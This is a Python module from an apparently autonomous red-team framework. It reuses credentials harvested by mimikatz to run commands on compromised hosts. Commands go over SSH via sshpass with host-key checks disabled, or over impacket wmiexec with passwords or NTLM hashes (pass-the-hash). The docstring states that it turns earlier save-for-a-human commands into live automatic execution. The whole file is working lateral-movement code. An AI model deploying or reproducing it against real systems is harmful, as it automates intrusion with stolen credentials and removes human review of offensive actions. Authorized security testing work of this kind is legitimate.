"""Foothold session manager — executes commands on live footholds (Phase 6).

Phase 4 shipped the enum/cred-harvest wrappers (linpeas, winpeas, mimikatz)
in evidence-string mode: they saved the command for a human to run and
returned empty results. Phase 5 added the transport layer (impacket
remote-exec for Windows, sshpass for Linux SSH footholds). This module
joins them: given an EngagementState it resolves credentials from
``harvested_secrets`` and transports a command to the foothold's host.

Usage: ``postex_node`` wraps its foothold loop in
``with foothold_session_context(state):`` — every wrapper that calls
``get_installed()`` then executes for real instead of saving a command
string. Single engagement per process is the CLI's reality; the context
manager guarantees uninstall on exceptions.
"""
from __future__ import annotations

from contextlib import contextmanager
from typing import TYPE_CHECKING

from pydantic import BaseModel

from autored.logging import get_logger
from autored.subprocess_runner import run_subprocess
from autored.tools.impacket_remote import impacket_wmiexec

if TYPE_CHECKING:  # pragma: no cover — import-only for type checkers
    from autored.models import Foothold
    from autored.state import EngagementState

log = get_logger("foothold_session")

SSH_TIMEOUT_SEC = 300
IMPACKET_TIMEOUT_SEC = 300


class FootholdCommandResult(BaseModel):
    """The execution outcome the enum wrappers parse.

    Wraps ``SubprocessResult`` / ``ImpacketRemoteResult`` into the single
    contract ``linpeas_run`` / ``winpeas_run`` / ``mimikatz_wrapper``
    inspect — the wrappers don't care whether the underlying transport
    was an SSH subprocess or an impacket WMI call.
    """

    command: str
    stdout: str
    stderr: str
    returncode: int
    duration_sec: float
    success: bool


class CredentialBundle(BaseModel):
    """Resolved credentials for one host.

    ``password`` is preferred over ``nthash`` — both sshpass and
    impacket_wmiexec accept either, but a plaintext password survives
    pass-the-hash mitigations on hardened hosts. ``username`` is parsed
    from ``Secret.source`` (``mimikatz:<provider>/<username>``) and falls
    back to a foothold's own username for that host.
    """

    username: str = ""
    password: str = ""
    nthash: str = ""


def _find_credentials_for_host(state: EngagementState, host_ip: str) -> CredentialBundle:
    """Resolve credentials for a host from harvested secrets.

    Passwords beat hashes (impacket + ssh both prefer them); usernames
    are parsed from ``Secret.source`` — credharvester writes
    ``mimikatz:<provider>/<username>`` — falling back to a foothold's
    own username for that host.
    """
    bundle = CredentialBundle()
    for secret in state.harvested_secrets:
        if secret.host_ip != host_ip:
            continue
        if secret.secret_type == "password" and not bundle.password:
            bundle.password = secret.secret_value
        elif secret.secret_type == "hash" and not bundle.nthash:
            bundle.nthash = secret.secret_value
        if "/" in secret.source and not bundle.username:
            candidate = secret.source.rsplit("/", 1)[-1].strip()
            if candidate and candidate.lower() not in {"null", "(null)"}:
                bundle.username = candidate
    if not bundle.username:
        for foothold in state.footholds:
            if foothold.host_ip == host_ip and foothold.username:
                bundle.username = foothold.username
                break
    return bundle


def _build_ssh_cmd(username: str, password: str, host: str, command: str) -> list[str]:
    """Build the sshpass+ssh argv list for one remote command.

    ``-o StrictHostKeyChecking=no`` and ``-o UserKnownHostsFile=/dev/null``
    keep ssh from blocking on the host-key prompt the first time a
    foothold's host is contacted — AutoRed has already verified the
    foothold via exploit, so the host-key is implicitly trusted for the
    engagement.
    """
    return [
        "sshpass", "-p", password,
        "ssh", "-o", "StrictHostKeyChecking=no", "-o", "UserKnownHostsFile=/dev/null",
        f"{username}@{host}", command,
    ]


class FootholdSessionManager:
    """Executes commands on footholds using state-resolved credentials.

    A single manager is installed per engagement via
    ``foothold_session_context(state)`` so the enum/cred-harvest wrappers
    can ``get_installed()`` it without threading a parameter through every
    sub-agent input model (which would touch six Phase 4 files + break
    their test patches for zero benefit).
    """

    def __init__(self, state: EngagementState):
        self.state = state

    def find_foothold(self, foothold_id: str) -> Foothold | None:
        for foothold in self.state.footholds:
            if foothold.id == foothold_id:
                return foothold
        return None

    async def execute(
        self,
        foothold: Foothold,
        command: str,
        timeout: int = 300,
    ) -> FootholdCommandResult:
        """Transport ``command`` to ``foothold.host_ip`` and return the outcome.

        Dispatch:

        * ``access_type == "ssh"`` → ``sshpass -p <password> ssh ... <user>@<host> <command>``
          via ``run_subprocess`` (Phase 5 transport for Linux SSH footholds).
        * ``access_type in ("winrm", "rpc")`` → ``impacket_wmiexec.ainvoke({...})``
          with the resolved bundle (password auth, or ``-hashes`` style
          when only an NTLM hash exists).
        * any other access type → ``success=False`` with a
          ``"no transport for access_type ..."`` stderr — the enum
          wrappers fall through to Phase 4 evidence-string mode.

        Returns a ``FootholdCommandResult`` whether or not the underlying
        transport succeeded — the wrappers decide whether to parse the
        stdout or save the command string for a human to run.
        """
        host = foothold.host_ip
        bundle = _find_credentials_for_host(self.state, host)

        if foothold.access_type == "ssh":
            username = bundle.username or foothold.username
            if not bundle.password:
                return FootholdCommandResult(
                    command=command, stdout="",
                    stderr="no password secret for ssh host",
                    returncode=-1, duration_sec=0.0, success=False,
                )
            cmd = _build_ssh_cmd(username, bundle.password, host, command)
            log.info("foothold_exec_ssh", host=host, username=username)
            sub = await run_subprocess(cmd, timeout=timeout)
            return FootholdCommandResult(
                command=command, stdout=sub.stdout, stderr=sub.stderr,
                returncode=sub.returncode, duration_sec=sub.duration_sec,
                success=sub.returncode == 0,
            )

        if foothold.access_type in ("winrm", "rpc"):
            if not (bundle.password or bundle.nthash):
                return FootholdCommandResult(
                    command=command, stdout="",
                    stderr="no password/hash secret for windows host",
                    returncode=-1, duration_sec=0.0, success=False,
                )
            username = bundle.username or foothold.username
            log.info("foothold_exec_wmiexec", host=host, username=username)
            impacket_result = await impacket_wmiexec.ainvoke({
                "username": username,
                "password": bundle.password,
                "nthash": bundle.nthash,
                "target": host,
                "command": command,
                "engagement_id": self.state.engagement_id,
            })
            return FootholdCommandResult(
                command=command, stdout=impacket_result.output,
                stderr="" if impacket_result.success else impacket_result.output,
                returncode=0 if impacket_result.success else 1,
                duration_sec=impacket_result.duration_sec,
                success=impacket_result.success,
            )

        return FootholdCommandResult(
            command=command, stdout="",
            stderr=f"no transport for access_type {foothold.access_type!r}",
            returncode=-1, duration_sec=0.0, success=False,
        )


# --- module-level install (single engagement per process) ----------------- #

_current_manager: FootholdSessionManager | None = None


def install(manager: FootholdSessionManager) -> None:
    """Install ``manager`` as the active session for the running process.

    Single-engagement-per-process is the CLI's reality — the context
    manager ``foothold_session_context`` is the normal entry point and
    guarantees the matching ``uninstall()`` even on exceptions.
    """
    global _current_manager
    _current_manager = manager


def uninstall() -> None:
    """Clear the active session manager (idempotent)."""
    global _current_manager
    _current_manager = None


def get_installed() -> FootholdSessionManager | None:
    """Return the active session manager, or ``None`` if none installed.

    Enum/cred-harvest wrappers call this at the top of their body —
    ``None`` means they fall through to Phase 4 evidence-string behaviour
    (save the command for a human, return an empty result).
    """
    return _current_manager


@contextmanager
def foothold_session_context(state: EngagementState):
    """Install a session manager for the duration of a post-ex pass.

    ``postex_node`` wraps its foothold loop in ``with
    foothold_session_context(state):`` so every enum/cred-harvest wrapper
    invoked during the pass resolves to a real ``FootholdSessionManager``
    via ``get_installed()``. The manager is uninstalled on exit — clean
    or exceptional — so a later engagement doesn't accidentally inherit
    a stale session.
    """
    manager = FootholdSessionManager(state)
    install(manager)
    try:
        yield manager
    finally:
        uninstall()
